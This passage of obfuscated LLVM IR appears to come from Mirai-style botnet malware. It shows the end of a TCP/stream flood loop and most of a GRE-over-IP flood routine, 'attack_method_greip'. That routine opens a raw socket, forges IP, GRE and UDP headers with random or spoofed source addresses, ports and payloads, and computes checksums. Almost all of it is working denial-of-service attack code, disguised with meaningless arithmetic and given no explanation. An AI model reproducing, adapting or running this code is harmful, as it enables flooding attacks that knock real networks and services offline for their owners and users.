  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 0
  %173 = bitcast %struct.sockaddr_in* %172 to %struct.sockaddr*
  store %struct.sockaddr* %173, %struct.sockaddr** %167, align 8
  %174 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %175 = load %struct.sockaddr*, %struct.sockaddr** %174, align 8
  %176 = call i32 @connect(i32 %166, %struct.sockaddr* %175, i32 16)
  %177 = icmp eq i32 %176, -1
  br i1 %177, label %178, label %179

; <label>:178:                                    ; preds = %161
  br label %179

; <label>:179:                                    ; preds = %178, %161
  br label %180

; <label>:180:                                    ; preds = %179
  %181 = load i32, i32* %9, align 4
  %182 = sub i32 %181, 814583784
  %183 = add i32 %182, 1
  %184 = add i32 %183, 814583784
  %185 = add nsw i32 %181, 1
  store i32 %184, i32* %9, align 4
  br label %59

; <label>:186:                                    ; preds = %59
  br label %187

; <label>:187:                                    ; preds = %220, %186
  store i32 0, i32* %9, align 4
  br label %188

; <label>:188:                                    ; preds = %215, %187
  %189 = load i32, i32* %9, align 4
  %190 = load i8, i8* %5, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp slt i32 %189, %191
  br i1 %192, label %193, label %220

; <label>:193:                                    ; preds = %188
  %194 = load i8**, i8*** %10, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds i8*, i8** %194, i64 %196
  %198 = load i8*, i8** %197, align 8
  store i8* %198, i8** %23, align 8
  %199 = load i8, i8* %15, align 1
  %200 = icmp ne i8 %199, 0
  br i1 %200, label %201, label %205

; <label>:201:                                    ; preds = %193
  %202 = load i8*, i8** %23, align 8
  %203 = load i16, i16* %14, align 2
  %204 = zext i16 %203 to i32
  call void @rand_str(i8* %202, i32 %204)
  br label %205

; <label>:205:                                    ; preds = %201, %193
  %206 = load i32*, i32** %11, align 8
  %207 = load i32, i32* %9, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds i32, i32* %206, i64 %208
  %210 = load i32, i32* %209, align 4
  %211 = load i8*, i8** %23, align 8
  %212 = load i16, i16* %14, align 2
  %213 = zext i16 %212 to i64
  %214 = call i64 @send(i32 %210, i8* %211, i64 %213, i32 16384)
  br label %215

; <label>:215:                                    ; preds = %205
  %216 = load i32, i32* %9, align 4
  %217 = sub i32 0, 1
  %218 = sub i32 %216, %217
  %219 = add nsw i32 %216, 1
  store i32 %218, i32* %9, align 4
  br label %188

; <label>:220:                                    ; preds = %188
  br label %187
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 1458)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %560

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %560

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %328, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %335

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 15, -1
  %118 = xor i8 %116, %117
  %119 = and i8 %118, %116
  %120 = and i8 %116, 15
  %121 = xor i8 %119, -1
  %122 = xor i8 64, -1
  %123 = xor i8 93, -1
  %124 = and i8 %121, 93
  %125 = and i8 %119, %123
  %126 = and i8 %122, 93
  %127 = and i8 64, %123
  %128 = or i8 %124, %125
  %129 = or i8 %126, %127
  %130 = xor i8 %128, %129
  %131 = or i8 %121, %122
  %132 = xor i8 %131, -1
  %133 = or i8 93, %123
  %134 = and i8 %132, %133
  %135 = or i8 %130, %134
  %136 = or i8 %119, 64
  store i8 %135, i8* %115, align 4
  %137 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 -16, -1
  %141 = xor i8 %139, %140
  %142 = and i8 %141, %139
  %143 = and i8 %139, -16
  %144 = xor i8 %142, -1
  %145 = xor i8 5, -1
  %146 = xor i8 103, -1
  %147 = and i8 %144, 103
  %148 = and i8 %142, %146
  %149 = and i8 %145, 103
  %150 = and i8 5, %146
  %151 = or i8 %147, %148
  %152 = or i8 %149, %150
  %153 = xor i8 %151, %152
  %154 = or i8 %144, %145
  %155 = xor i8 %154, -1
  %156 = or i8 103, %146
  %157 = and i8 %155, %156
  %158 = or i8 %153, %157
  %159 = or i8 %142, 5
  store i8 %158, i8* %138, align 4
  %160 = load i8, i8* %12, align 1
  %161 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 1
  store i8 %160, i8* %162, align 1
  %163 = load i32, i32* %18, align 4
  %164 = sext i32 %163 to i64
  %165 = sub i64 0, %164
  %166 = sub i64 52, %165
  %167 = add i64 52, %164
  %168 = trunc i64 %166 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  %172 = load i16, i16* %13, align 2
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 3
  store i16 %173, i16* %175, align 4
  %176 = load i8, i8* %14, align 1
  %177 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 5
  store i8 %176, i8* %178, align 4
  %179 = load i8, i8* %15, align 1
  %180 = icmp ne i8 %179, 0
  br i1 %180, label %181, label %185

; <label>:181:                                    ; preds = %93
  %182 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 4
  store i16 %182, i16* %184, align 2
  br label %185

; <label>:185:                                    ; preds = %181, %93
  %186 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 6
  store i8 47, i8* %187, align 1
  %188 = load i32, i32* %21, align 4
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 8
  store i32 %188, i32* %190, align 4
  %191 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 1
  %196 = load i32, i32* %195, align 4
  %197 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 9
  store i32 %196, i32* %198, align 4
  %199 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %200 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %201 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %203 = bitcast %struct.iphdr* %202 to i8*
  %204 = load i8, i8* %203, align 4
  %205 = xor i8 15, -1
  %206 = xor i8 %204, %205
  %207 = and i8 %206, %204
  %208 = and i8 %204, 15
  %209 = xor i8 %207, -1
  %210 = xor i8 64, -1
  %211 = xor i8 -6, -1
  %212 = and i8 %209, -6
  %213 = and i8 %207, %211
  %214 = and i8 %210, -6
  %215 = and i8 64, %211
  %216 = or i8 %212, %213
  %217 = or i8 %214, %215
  %218 = xor i8 %216, %217
  %219 = or i8 %209, %210
  %220 = xor i8 %219, -1
  %221 = or i8 -6, %211
  %222 = and i8 %220, %221
  %223 = or i8 %218, %222
  %224 = or i8 %207, 64
  store i8 %223, i8* %203, align 4
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = bitcast %struct.iphdr* %225 to i8*
  %227 = load i8, i8* %226, align 4
  %228 = xor i8 %227, -1
  %229 = xor i8 -16, -1
  %230 = xor i8 -88, -1
  %231 = or i8 %228, %229
  %232 = or i8 -88, %230
  %233 = xor i8 %231, -1
  %234 = and i8 %233, %232
  %235 = and i8 %227, -16
  %236 = and i8 %234, 5
  %237 = xor i8 %234, 5
  %238 = or i8 %236, %237
  %239 = or i8 %234, 5
  store i8 %238, i8* %226, align 4
  %240 = load i8, i8* %12, align 1
  %241 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 1
  store i8 %240, i8* %242, align 1
  %243 = load i32, i32* %18, align 4
  %244 = sext i32 %243 to i64
  %245 = sub i64 0, 28
  %246 = sub i64 0, %244
  %247 = add i64 %245, %246
  %248 = sub i64 0, %247
  %249 = add i64 28, %244
  %250 = trunc i64 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %13, align 2
  %255 = zext i16 %254 to i32
  %256 = xor i32 %255, -1
  %257 = and i32 -1, %256
  %258 = xor i32 -1, -1
  %259 = and i32 %255, %258
  %260 = or i32 %257, %259
  %261 = xor i32 %255, -1
  %262 = trunc i32 %260 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #7
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 3
  store i16 %263, i16* %265, align 4
  %266 = load i8, i8* %14, align 1
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 5
  store i8 %266, i8* %268, align 4
  %269 = load i8, i8* %15, align 1
  %270 = icmp ne i8 %269, 0
  br i1 %270, label %271, label %275

; <label>:271:                                    ; preds = %185
  %272 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %273 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 4
  store i16 %272, i16* %274, align 2
  br label %275

; <label>:275:                                    ; preds = %271, %185
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 6
  store i8 17, i8* %277, align 1
  %278 = call i32 @rand_next()
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  store i32 %278, i32* %280, align 4
  %281 = load i8, i8* %20, align 1
  %282 = icmp ne i8 %281, 0
  br i1 %282, label %283, label %289

; <label>:283:                                    ; preds = %275
  %284 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 9
  %286 = load i32, i32* %285, align 4
  %287 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 9
  store i32 %286, i32* %288, align 4
  br label %309

; <label>:289:                                    ; preds = %275
  %290 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 8
  %292 = load i32, i32* %291, align 4
  %293 = sub i32 0, 1024
  %294 = add i32 %292, %293
  %295 = sub i32 %292, 1024
  %296 = xor i32 %294, -1
  %297 = and i32 469523654, %296
  %298 = xor i32 469523654, -1
  %299 = and i32 %294, %298
  %300 = xor i32 -1, -1
  %301 = and i32 %300, 469523654
  %302 = and i32 -1, %298
  %303 = or i32 %297, %299
  %304 = or i32 %301, %302
  %305 = xor i32 %303, %304
  %306 = xor i32 %294, -1
  %307 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 9
  store i32 %305, i32* %308, align 4
  br label %309

; <label>:309:                                    ; preds = %289, %283
  %310 = load i16, i16* %16, align 2
  %311 = call zeroext i16 @htons(i16 zeroext %310) #7
  %312 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 0
  store i16 %311, i16* %313, align 2
  %314 = load i16, i16* %17, align 2
  %315 = call zeroext i16 @htons(i16 zeroext %314) #7
  %316 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 1
  store i16 %315, i16* %317, align 2
  %318 = load i32, i32* %18, align 4
  %319 = sext i32 %318 to i64
  %320 = sub i64 8, -5916614474573403903
  %321 = add i64 %320, %319
  %322 = add i64 %321, -5916614474573403903
  %323 = add i64 8, %319
  %324 = trunc i64 %322 to i16
  %325 = call zeroext i16 @htons(i16 zeroext %324) #7
  %326 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i32 0, i32 2
  store i16 %325, i16* %327, align 2
  br label %328

; <label>:328:                                    ; preds = %309
  %329 = load i32, i32* %9, align 4
  %330 = sub i32 0, %329
  %331 = sub i32 0, 1
  %332 = add i32 %330, %331
  %333 = sub i32 0, %332
  %334 = add nsw i32 %329, 1
  store i32 %333, i32* %9, align 4
  br label %88

; <label>:335:                                    ; preds = %88
  br label %336

; <label>:336:                                    ; preds = %559, %335
  store i32 0, i32* %9, align 4
  br label %337

; <label>:337:                                    ; preds = %552, %336
  %338 = load i32, i32* %9, align 4
  %339 = load i8, i8* %5, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp slt i32 %338, %340
  br i1 %341, label %342, label %559

; <label>:342:                                    ; preds = %337
  %343 = load i8**, i8*** %11, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds i8*, i8** %343, i64 %345
  %347 = load i8*, i8** %346, align 8
  store i8* %347, i8** %26, align 8
  %348 = load i8*, i8** %26, align 8
  %349 = bitcast i8* %348 to %struct.iphdr*
  store %struct.iphdr* %349, %struct.iphdr** %27, align 8
  %350 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i64 1
  %352 = bitcast %struct.iphdr* %351 to %struct.grehdr*
  store %struct.grehdr* %352, %struct.grehdr** %28, align 8
  %353 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %354 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %353, i64 1
  %355 = bitcast %struct.grehdr* %354 to %struct.iphdr*
  store %struct.iphdr* %355, %struct.iphdr** %29, align 8
  %356 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i64 1
  %358 = bitcast %struct.iphdr* %357 to %struct.udphdr*
  store %struct.udphdr* %358, %struct.udphdr** %30, align 8
  %359 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i64 1
  %361 = bitcast %struct.udphdr* %360 to i8*
  store i8* %361, i8** %31, align 8
  %362 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %363 = load i32, i32* %9, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 2
  %367 = load i8, i8* %366, align 4
  %368 = zext i8 %367 to i32
  %369 = icmp slt i32 %368, 32
  br i1 %369, label %370, label %394

; <label>:370:                                    ; preds = %342
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 1
  %376 = load i32, i32* %375, align 4
  %377 = call i32 @ntohl(i32 %376) #7
  %378 = call i32 @rand_next()
  %379 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %380 = load i32, i32* %9, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 2
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = lshr i32 %378, %385
  %387 = add i32 %377, -1404981716
  %388 = add i32 %387, %386
  %389 = sub i32 %388, -1404981716
  %390 = add i32 %377, %386
  %391 = call i32 @htonl(i32 %389) #7
  %392 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  br label %394

; <label>:394:                                    ; preds = %370, %342
  %395 = load i32, i32* %21, align 4
  %396 = icmp eq i32 %395, -1
  br i1 %396, label %397, label %401

; <label>:397:                                    ; preds = %394
  %398 = call i32 @rand_next()
  %399 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 8
  store i32 %398, i32* %400, align 4
  br label %401

; <label>:401:                                    ; preds = %397, %394
  %402 = load i16, i16* %13, align 2
  %403 = zext i16 %402 to i32
  %404 = icmp eq i32 %403, 65535
  br i1 %404, label %405, label %435

; <label>:405:                                    ; preds = %401
  %406 = call i32 @rand_next()
  %407 = xor i32 65535, -1
  %408 = xor i32 %406, %407
  %409 = and i32 %408, %406
  %410 = and i32 %406, 65535
  %411 = trunc i32 %409 to i16
  %412 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 3
  store i16 %411, i16* %413, align 4
  %414 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 3
  %416 = load i16, i16* %415, align 4
  %417 = zext i16 %416 to i32
  %418 = sub i32 0, 1000
  %419 = add i32 %417, %418
  %420 = sub nsw i32 %417, 1000
  %421 = xor i32 %419, -1
  %422 = and i32 -1806850235, %421
  %423 = xor i32 -1806850235, -1
  %424 = and i32 %419, %423
  %425 = xor i32 -1, -1
  %426 = and i32 %425, -1806850235
  %427 = and i32 -1, %423
  %428 = or i32 %422, %424
  %429 = or i32 %426, %427
  %430 = xor i32 %428, %429
  %431 = xor i32 %419, -1
  %432 = trunc i32 %430 to i16
  %433 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 3
  store i16 %432, i16* %434, align 4
  br label %435

; <label>:435:                                    ; preds = %405, %401
  %436 = load i16, i16* %16, align 2
  %437 = zext i16 %436 to i32
  %438 = icmp eq i32 %437, 65535
  br i1 %438, label %439, label %448

; <label>:439:                                    ; preds = %435
  %440 = call i32 @rand_next()
  %441 = xor i32 65535, -1
  %442 = xor i32 %440, %441
  %443 = and i32 %442, %440
  %444 = and i32 %440, 65535
  %445 = trunc i32 %443 to i16
  %446 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %447 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %446, i32 0, i32 0
  store i16 %445, i16* %447, align 2
  br label %448

; <label>:448:                                    ; preds = %439, %435
  %449 = load i16, i16* %17, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %461

; <label>:452:                                    ; preds = %448
  %453 = call i32 @rand_next()
  %454 = xor i32 65535, -1
  %455 = xor i32 %453, %454
  %456 = and i32 %455, %453
  %457 = and i32 %453, 65535
  %458 = trunc i32 %456 to i16
  %459 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %460 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %459, i32 0, i32 1
  store i16 %458, i16* %460, align 2
  br label %461

; <label>:461:                                    ; preds = %452, %448
  %462 = load i8, i8* %20, align 1
  %463 = icmp ne i8 %462, 0
  br i1 %463, label %468, label %464

; <label>:464:                                    ; preds = %461
  %465 = call i32 @rand_next()
  %466 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i32 0, i32 9
  store i32 %465, i32* %467, align 4
  br label %474

; <label>:468:                                    ; preds = %461
  %469 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 9
  %471 = load i32, i32* %470, align 4
  %472 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 9
  store i32 %471, i32* %473, align 4
  br label %474

; <label>:474:                                    ; preds = %468, %464
  %475 = load i8, i8* %19, align 1
  %476 = icmp ne i8 %475, 0
  br i1 %476, label %477, label %480

; <label>:477:                                    ; preds = %474
  %478 = load i8*, i8** %31, align 8
  %479 = load i32, i32* %18, align 4
  call void @rand_str(i8* %478, i32 %479)
  br label %480

; <label>:480:                                    ; preds = %477, %474
  %481 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 7
  store i16 0, i16* %482, align 2
  %483 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %484 = bitcast %struct.iphdr* %483 to i16*
  %485 = call zeroext i16 @checksum_generic(i16* %484, i32 20)
  %486 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 7
  store i16 %485, i16* %487, align 2
  %488 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 7
  store i16 0, i16* %489, align 2
  %490 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %491 = bitcast %struct.iphdr* %490 to i16*
  %492 = call zeroext i16 @checksum_generic(i16* %491, i32 20)
  %493 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %494 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %493, i32 0, i32 7
  store i16 %492, i16* %494, align 2
  %495 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %496 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %495, i32 0, i32 3
  store i16 0, i16* %496, align 2
